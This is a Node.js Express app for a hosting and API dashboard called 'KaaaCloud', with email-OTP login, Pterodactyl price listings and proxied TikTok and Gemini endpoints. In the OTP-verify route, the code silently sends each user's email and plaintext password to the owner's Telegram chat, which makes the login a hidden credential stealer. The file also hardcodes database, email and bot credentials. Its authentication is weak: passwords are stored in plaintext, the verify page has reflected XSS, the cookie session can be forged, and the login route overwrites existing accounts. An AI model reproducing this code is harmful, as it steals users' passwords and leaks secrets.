const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// --- CONFIGURATION ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";
const TELE_ORDER = "https://t.me/autoorderkaabot";

const resend = new Resend(RESEND_API);
mongoose.connect(MONGO_URI).catch(err => console.error("DB Error:", err));

// --- MODELS ---
const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// --- MIDDLEWARE ---
const checkAuth = async (req, res, next) => {
    const email = req.cookies.userEmail;
    if (!email) return res.redirect('/login');
    const user = await User.findOne({ email, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

async function hit() {
    await Stats.findOneAndUpdate({ name: "main" }, { $inc: { total_req: 1 } }, { upsert: true });
}

// --- AUTH SYSTEM (LOGIN & VERIFY) ---
app.get('/login', (req, res) => {
    res.send(`<body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <div style="background:rgba(30,41,59,0.5); backdrop-filter:blur(15px); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center;">
            <h1 style="color:#38bdf8; font-size:24px; margin-bottom:10px;">KAAA LOGIN</h1>
            <form action="/auth/login" method="POST">
                <input name="email" type="email" placeholder="Email" style="width:100%; padding:12px; margin-bottom:12px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <input name="password" type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; cursor:pointer;">LOGIN & GET OTP</button>
            </form>
        </div>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    try {
        await User.findOneAndUpdate({ email }, { password, otp, isVerified: false }, { upsert: true });
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'Verification Code',
            html: `<h1>OTP: ${otp}</h1>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Error: " + e.message); }
});

app.get('/verify', (req, res) => {
    res.send(`<body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
        <form action="/auth/verify" method="POST" style="background:rgba(30,41,59,0.5); padding:40px; border-radius:30px; border:1px solid #38bdf8; text-align:center;">
            <input name="email" type="hidden" value="${req.query.email}">
            <input name="otp" type="text" maxlength="6" style="width:100%; padding:15px; margin:20px 0; border-radius:12px; font-size:30px; text-align:center; background:#0f172a; color:white; border:none;" placeholder="OTP" required>
            <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold;">VERIFY</button>
        </form>
    </body>`);
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });
    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email, { maxAge: 86400000, httpOnly: true });
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID,
            text: `🚀 *LOGIN BERHASIL*\n📧 Email: \`${email}\`\n🔑 Pass: \`${user.password}\``,
            parse_mode: 'Markdown'
        });
        res.redirect('/');
    } else { res.send("OTP Salah!"); }
});

// --- DASHBOARD UTAMA (WITH SIDEBAR & TAB SYSTEM) ---
app.get('/', checkAuth, async (req, res) => {
    const totalUser = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    const domain = req.get('host');

    res.send(`<!DOCTYPE html><html lang="id"><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <title>KaaaCloud Dashboard</title>
        <style>
            body { background: #020617; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
            .sidebar { transition: 0.3s; width: 0; overflow: hidden; position: fixed; height: 100vh; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(20px); border-right: 1px solid rgba(56, 189, 248, 0.2); z-index: 50; }
            .sidebar.active { width: 280px; }
            .glass { background: rgba(30, 41, 59, 0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
            .btn-tab { padding: 12px 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; }
            .btn-tab.active { background: #38bdf8; color: #0f172a; font-weight: 800; }
        </style>
    </head>
    <body>
        <div id="mySidebar" class="sidebar">
            <div class="p-6">
                <div class="flex justify-between items-center mb-10">
                    <span class="text-xl font-black text-sky-400">MENU</span>
                    <button onclick="toggleSidebar()"><i class="fas fa-times text-xl"></i></button>
                </div>
                <div class="space-y-4">
                    <button onclick="switchTab('dashboard')" class="w-full text-left p-4 rounded-xl hover:bg-sky-500/10 flex items-center gap-3"><i class="fas fa-home"></i> Home</button>
                    <button onclick="switchTab('pterodactyl')" class="w-full text-left p-4 rounded-xl hover:bg-sky-500/10 flex items-center gap-3"><i class="fas fa-server"></i> Panel Pterodactyl</button>
                    <button onclick="switchTab('api-command')" class="w-full text-left p-4 rounded-xl hover:bg-sky-500/10 flex items-center gap-3"><i class="fas fa-code"></i> Command API</button>
                    <a href="/logout" class="block p-4 text-red-400 font-bold"><i class="fas fa-sign-out-alt"></i> Logout</a>
                </div>
            </div>
        </div>

        <div id="main" class="p-6 max-w-5xl mx-auto">
            <div class="flex justify-between items-center mb-10">
                <button onclick="toggleSidebar()" class="bg-sky-500/10 p-3 rounded-xl border border-sky-500/20"><i class="fas fa-bars text-sky-400"></i></button>
                <div class="text-center">
                    <h2 class="text-xl font-black italic">KAAA<span class="text-sky-500">CLOUD</span></h2>
                </div>
                <div class="w-10 h-10 bg-slate-800 rounded-full flex items-center justify-center border border-sky-500/30"><i class="fas fa-user text-xs"></i></div>
            </div>

            <div id="tab-dashboard" class="tab-content">
                <div class="grid grid-cols-2 gap-4 mb-8">
                    <div class="glass p-6 rounded-3xl text-center">
                        <p class="text-3xl font-black text-sky-400">${totalUser}</p>
                        <p class="text-[10px] tracking-widest uppercase text-slate-500">Total User</p>
                    </div>
                    <div class="glass p-6 rounded-3xl text-center">
                        <p class="text-3xl font-black text-indigo-400">${statData.total_req}</p>
                        <p class="text-[10px] tracking-widest uppercase text-slate-500">Total Hit API</p>
                    </div>
                </div>
                <div class="glass p-8 rounded-[2.5rem] text-center">
                    <h3 class="text-2xl font-black mb-2 italic uppercase">Selamat Datang</h3>
                    <p class="text-slate-400 text-xs mb-6">Pilih menu di samping untuk mulai mengelola layanan lo.</p>
                </div>
            </div>

            <div id="tab-pterodactyl" class="tab-content hidden animate-fade-in">
                <div class="text-center mb-8">
                    <h2 class="text-2xl font-black italic">PTERODACTYL STORE</h2>
                    <p class="text-slate-500 text-xs">Hosting murah kualitas mewah.</p>
                </div>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div class="glass p-8 rounded-[2.5rem] border-sky-500/20">
                        <h4 class="font-bold text-lg">Ram 1GB</h4>
                        <p class="text-3xl font-black my-4 text-sky-400">Rp 3.317</p>
                        <ul class="text-xs space-y-2 text-slate-400 mb-6">
                            <li><i class="fas fa-check text-sky-400 mr-2"></i> CPU 30%</li>
                            <li><i class="fas fa-check text-sky-400 mr-2"></i> SSD 2GB</li>
                        </ul>
                        <a href="${TELE_ORDER}" class="block text-center bg-sky-500 text-slate-900 font-black py-3 rounded-2xl">Order Now</a>
                    </div>
                    <div class="glass p-8 rounded-[2.5rem] border-indigo-500/20">
                        <h4 class="font-bold text-lg">Ram 6GB</h4>
                        <p class="text-3xl font-black my-4 text-indigo-400">Rp 10.920</p>
                        <ul class="text-xs space-y-2 text-slate-400 mb-6">
                            <li><i class="fas fa-check text-indigo-400 mr-2"></i> CPU 100%</li>
                            <li><i class="fas fa-check text-indigo-400 mr-2"></i> SSD 11GB</li>
                        </ul>
                        <a href="${TELE_ORDER}" class="block text-center bg-indigo-500 text-white font-black py-3 rounded-2xl">Order Now</a>
                    </div>
                </div>
            </div>

            <div id="tab-api-command" class="tab-content hidden">
                <div class="text-center mb-8">
                    <h2 class="text-2xl font-black italic">COMMAND API EXAMPLES</h2>
                    <p class="text-slate-500 text-xs">Salin dan gunakan di aplikasi lo.</p>
                </div>
                <div class="space-y-6">
                    <div class="glass p-6 rounded-3xl">
                        <h5 class="text-xs font-bold text-sky-400 uppercase tracking-widest mb-3">TIKTOK SEARCH COMMAND</h5>
                        <div class="bg-black/50 p-4 rounded-xl relative">
                            <code id="cmd1" class="text-emerald-400 text-xs break-all">https://${domain}/search/tiktok?q=musik</code>
                            <button onclick="copyToClipboard('cmd1')" class="absolute top-3 right-3 text-slate-500 hover:text-white"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                    <div class="glass p-6 rounded-3xl">
                        <h5 class="text-xs font-bold text-indigo-400 uppercase tracking-widest mb-3">AI GEMINI COMMAND</h5>
                        <div class="bg-black/50 p-4 rounded-xl relative">
                            <code id="cmd2" class="text-emerald-400 text-xs break-all">https://${domain}/ai/gemini?text=halo</code>
                            <button onclick="copyToClipboard('cmd2')" class="absolute top-3 right-3 text-slate-500 hover:text-white"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <script>
            function toggleSidebar() { document.getElementById("mySidebar").classList.toggle("active"); }
            
            function switchTab(tabId) {
                document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
                document.getElementById('tab-' + tabId).classList.remove('hidden');
                toggleSidebar();
            }

            function copyToClipboard(id) {
                const text = document.getElementById(id).innerText;
                navigator.clipboard.writeText(text);
                alert("Command Berhasil Disalin!");
            }
        </script>
    </body></html>`);
});

// --- API ENDPOINTS ---
app.get('/search/tiktok', checkAuth, async (req, res) => {
    const q = req.query.q;
    if (!q) return res.json({ status: false, msg: "q?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/search/tiktok?q=${encodeURIComponent(q)}`);
        res.json({ status: true, creator: "Kaaaoffc", result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

app.get('/ai/gemini', checkAuth, async (req, res) => {
    const text = req.query.text;
    if (!text) return res.json({ status: false, msg: "text?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/ai/gemini?text=${encodeURIComponent(text)}`);
        res.json({ status: true, result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

app.get('/logout', (req, res) => { res.clearCookie('userEmail'); res.redirect('/login'); });

module.exports = app;
